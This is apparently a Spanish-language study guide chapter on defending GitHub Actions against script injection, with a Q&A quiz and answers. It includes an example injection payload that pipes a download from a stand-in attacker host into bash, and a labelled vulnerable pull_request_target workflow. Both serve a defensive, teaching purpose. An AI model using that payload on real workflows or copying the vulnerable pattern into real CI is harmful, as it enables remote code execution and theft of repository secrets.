# 5.2.2 Script Injection — Mitigación y Defensa en Profundidad

← [5.2.1 Script Injection — Vectores](gha-script-injection-vectores.md) | [Índice](README.md) | [5.3.1 GITHUB_TOKEN — Lifecycle](gha-github-token-lifecycle.md) →

---

Reconocer un vector de ataque no basta: hay que saber cómo eliminarlo. La mitigación de script injection en GitHub Actions se basa en un principio simple — nunca interpolar valores de contexto directamente en comandos shell — pero tiene varias formas concretas de aplicación según el tipo de input y la operación que se realiza.

## El problema de la interpolación directa

Cuando se escribe `run: echo "${{ github.event.issue.title }}"`, GitHub sustituye la expresión antes de que el shell reciba el comando. Si el título del issue contiene `$(curl attacker.com | bash)`, el shell ejecuta ese comando. La interpolación ocurre en tiempo de plantilla, antes de la ejecución, por lo que no hay escape automático.

| Patrón | ¿Seguro? | Por qué |
|--------|:--------:|---------|
| `run: echo "${{ github.event.issue.title }}"` | No | El valor se interpola antes del shell |
| `env: TITLE: "${{ ... }}"` + `run: echo "$TITLE"` | Sí | El shell expande `$TITLE` como string literal |
| `run: echo '${{ ... }}'` (comillas simples) | No | La interpolación ocurre antes del shell |
| Usar `jq` para parsear JSON sin shell expansion | Sí | jq no ejecuta el contenido como comandos |

## Mitigación principal: variable de entorno intermediaria

La defensa más directa es separar la interpolación de la ejecución. En lugar de incrustar la expresión `${{ }}` dentro del comando shell, se asigna el valor a una variable de entorno y el comando usa esa variable.

> [CONCEPTO] La variable de entorno actúa como barrera de aislamiento: el shell expande `$TITLE` como un string literal y nunca interpreta su contenido como un comando, independientemente de lo que contenga.

```yaml
# .github/workflows/safe-issue-handler.yml
name: Issue handler seguro

on:
  issues:
    types: [opened]

permissions:
  issues: write
  contents: none

jobs:
  handle:
    runs-on: ubuntu-latest
    steps:
      - name: Procesar título del issue (forma insegura — NO usar)
        # MAL: el título se interpola directamente en el shell
        # run: echo "Nuevo issue: ${{ github.event.issue.title }}"

      - name: Procesar título del issue (forma segura)
        env:
          ISSUE_TITLE: "${{ github.event.issue.title }}"
          ISSUE_BODY: "${{ github.event.issue.body }}"
          ISSUE_USER: "${{ github.event.issue.user.login }}"
        run: |
          echo "Nuevo issue de: $ISSUE_USER"
          echo "Título: $ISSUE_TITLE"
          # Procesar el body sin riesgo de inyección
          echo "$ISSUE_BODY" | wc -c

      - name: Parsear JSON con jq (seguro para payloads complejos)
        env:
          EVENT_JSON: "${{ toJSON(github.event.issue) }}"
        run: |
          # jq no ejecuta el contenido — solo parsea JSON
          LABELS=$(echo "$EVENT_JSON" | jq -r '.labels[].name' | tr '\n' ',')
          echo "Labels: $LABELS"
```

> [ADVERTENCIA] Las comillas simples en `run: echo '${{ expr }}'` NO protegen contra inyección. La interpolación de `${{ }}` ocurre antes de que el shell procese las comillas.

## Caso especial: pull_request_target

El evento `pull_request_target` es el más peligroso porque se ejecuta con los permisos del repositorio base (acceso a secrets) y el código del fork puede dispararlo mediante un PR.

> [EXAMEN] La combinación `pull_request_target` + `actions/checkout` con el código del PR es el patrón de vulnerabilidad más evaluado en el examen GH-200. Si el step hace checkout del código del PR (`ref: ${{ github.event.pull_request.head.sha }}`), el código malicioso del fork se ejecuta con permisos del repo base.

```yaml
# PATRÓN VULNERABLE — NO usar
on:
  pull_request_target:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # checkout del fork — peligroso
      - run: npm ci && npm test  # ejecuta código del attacker con secrets del repo base
```

La mitigación es no hacer checkout del código del PR dentro de `pull_request_target`, o separar en dos workflows: uno con `pull_request` (sin secrets) para el build y otro con `pull_request_target` (con secrets) solo para operaciones que requieran permisos elevados y no ejecuten código del fork.

## Permisos mínimos como defensa complementaria

Aplicar el principio de mínimo privilegio no elimina la vulnerabilidad de inyección, pero reduce el radio de daño si se produce.

```yaml
permissions:
  issues: write    # solo lo necesario para comentar en el issue
  contents: none   # no puede leer ni escribir código del repo
```

> [CONCEPTO] La defensa en profundidad combina: (1) variable de entorno intermediaria para eliminar el vector, (2) permisos mínimos para limitar el daño si falla la primera capa, (3) revisión de actions de terceros que lean contextos no confiables internamente.

## Herramientas de auditoría

La herramienta `zizmor` analiza estáticamente los ficheros de workflow y detecta patrones de script injection, uso inseguro de `pull_request_target` y otras vulnerabilidades de seguridad. Es la herramienta de auditoría de workflows más mencionada en el contexto del examen GH-200.

```bash
# Instalar y auditar todos los workflows del repositorio
pip install zizmor
zizmor .github/workflows/
```

## Buenas y malas prácticas

**Hacer:**
- Pasar valores de contexto no confiables a través de variables de entorno (`env:`) antes de usarlos en `run:` — razón: el shell no interpreta el contenido de la variable como comandos
- Usar `jq` para procesar payloads JSON de eventos externos — razón: jq parsea JSON sin invocar el shell sobre el contenido
- Declarar `permissions: contents: none` en jobs que solo necesitan interactuar con issues o PRs — razón: limita el impacto en caso de explotación
- Auditar workflows con `zizmor` en CI — razón: detecta automáticamente patrones vulnerables antes de que lleguen a producción

**Evitar:**
- Interpolar `${{ github.event.* }}` directamente en bloques `run:` — razón: cualquier valor controlado por el usuario puede ejecutar comandos arbitrarios
- Usar `pull_request_target` con checkout del código del fork — razón: ejecuta código de un repositorio externo no confiable con los permisos y secrets del repo base
- Confiar en comillas simples o dobles para proteger contra inyección — razón: la interpolación `${{ }}` ocurre antes del procesamiento de comillas por el shell

## Verificación y práctica

**P1: ¿Cuál de estos patrones protege correctamente contra script injection en un step `run:`?**

a) `run: echo '${{ github.event.issue.title }}'`
b) `run: echo "${{ github.event.issue.title }}"`
c) `env: TITLE: "${{ github.event.issue.title }}"` seguido de `run: echo "$TITLE"`
d) `run: echo "$(echo ${{ github.event.issue.title }})"` 

**Respuesta: c)** — La variable de entorno es el único patrón seguro. La opción a) falla porque la interpolación ocurre antes del shell. La opción b) es el patrón vulnerable clásico. La opción d) añade una ejecución de subshell que agrava el problema.

**P2: ¿Por qué `pull_request_target` con checkout del código del PR es especialmente peligroso?**

a) Porque `pull_request_target` no tiene acceso a secrets
b) Porque ejecuta código del fork con los permisos y secrets del repositorio base
c) Porque el checkout falla en forks privados
d) Porque `pull_request_target` solo se ejecuta en la rama predeterminada

**Respuesta: b)** — `pull_request_target` se ejecuta en el contexto del repo base (con sus secrets y permisos), y si se hace checkout del código del PR, se ejecuta código controlado por el atacante en ese contexto privilegiado.

**P3: Un workflow tiene `run: gh issue comment --body "${{ github.event.comment.body }}"`. ¿Cuál es la corrección mínima y suficiente?**

a) Cambiar a comillas simples: `run: gh issue comment --body '${{ ... }}'`
b) Declarar `permissions: issues: read` para limitar el acceso
c) Mover el valor a `env: COMMENT_BODY: "${{ github.event.comment.body }}"` y usar `$COMMENT_BODY`
d) Usar `continue-on-error: true` para que el workflow no falle si hay inyección

**Respuesta: c)** — La variable de entorno intermediaria es la corrección correcta. Las opciones a) y d) no mitigan la inyección. La opción b) reduce el daño pero no elimina el vector.

---

← [5.2.1 Script Injection — Vectores](gha-script-injection-vectores.md) | [Índice](README.md) | [5.3.1 GITHUB_TOKEN — Lifecycle](gha-github-token-lifecycle.md) →
